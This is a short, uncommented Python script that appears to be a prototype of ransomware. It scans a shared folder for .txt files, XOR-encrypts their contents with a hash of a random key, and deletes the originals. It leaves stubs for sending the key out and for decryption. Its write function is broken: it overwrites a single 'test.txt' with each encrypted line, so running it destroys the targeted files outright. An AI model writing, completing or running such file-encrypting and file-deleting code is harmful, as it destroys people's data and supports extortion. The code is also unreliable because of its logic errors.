from os import remove, walk
from hashlib import sha512
from string import ascii_letters, digits, punctuation
from random import sample
from pathlib import Path

ALL_FILES   = list()
FILES_PATH  = 'D:/share folder/sources'
KEY_LENGTH  = 20
EXTENSION   = ['.txt']

def generateCipherKey():
    all_char = ascii_letters + digits + punctuation
    return ''.join(sample(all_char, KEY_LENGTH))

def readFile(path):
    with open(path) as content:
        return content.readlines()

def replaceFile(file_name, content):
    with open(f'{FILES_PATH}/test.txt', "w+") as file:
        file.write(content)

def xorCipher():
    cipher_key  = generateCipherKey()
    key_hash    = sha512(cipher_key.encode('utf-8')).digest()
    print(f'cipher_key: {cipher_key}')
    
    for file in ALL_FILES:
        file_content = readFile(file)
        remove(file)
        
        if len(file_content) != 0:
            counter = 0
            for item in file_content:
                encrypted_data = []
                for i in range(len(item)):
                    if counter < len(key_hash) - 1: counter += 1
                    else: counter = 0
                    encrypted_data.append(ord(item[i])^key_hash[counter])
                replaceFile(file, str(bytes(encrypted_data)))

def sendKey(key):
    ...

def xorDecipher(cipher_key):
    ...

if __name__ == '__main__':
    try:
        for folder, sub_folder, files in walk(FILES_PATH):
            for item in range(len(files)):
                if Path(files[item]).suffix in EXTENSION:
                    ALL_FILES.append(f"{folder}/{files[item]}")
        xorCipher()
    except Exception as e:
        print(f'Error: {str(e)}')